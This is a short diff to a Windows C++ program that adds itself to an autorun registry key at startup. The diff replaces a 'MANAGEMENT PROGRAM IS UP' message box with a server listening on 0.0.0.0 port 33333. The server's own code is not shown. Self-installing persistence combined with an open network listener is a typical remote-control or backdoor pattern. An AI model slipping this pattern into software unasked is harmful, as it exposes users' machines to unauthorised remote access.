@@ -1,3 +1,5 @@
+#include "server.h"
+
 #include "registry_actions.h"
 
 #include <string>
@@ -19,6 +21,7 @@ const std::string MESSAGE_BOX_BODY = "MANAGEMENT PROGRAM IS UP";
 #define SLEEPING_DURATION (HOUR)
 
 #define ERROR (-1)
+#define SUCCESS (0)
 
 /*
 * @brief Displays a Message Box onto the screen.
@@ -58,9 +61,11 @@ int main(int argc, char** argv) {
     WaitForSingleObject(programMutex, INFINITE);
     addRegEntryIfNotExists(AUTORUN_REG_PATH, AUTORUN_ENTRY_NAME, argv[0]);
 
-    int messageBoxCode = showMessageBox(MESSAGE_BOX_TITLE, MESSAGE_BOX_BODY);
+    //int messageBoxCode = showMessageBox(MESSAGE_BOX_TITLE, MESSAGE_BOX_BODY);
+    ManagementServer server = ManagementServer("0.0.0.0", 33333);
+    server.start();
     Sleep(SLEEPING_DURATION);
     ReleaseMutex(programMutex);
 
-    return messageBoxCode;
+    return SUCCESS;
 }
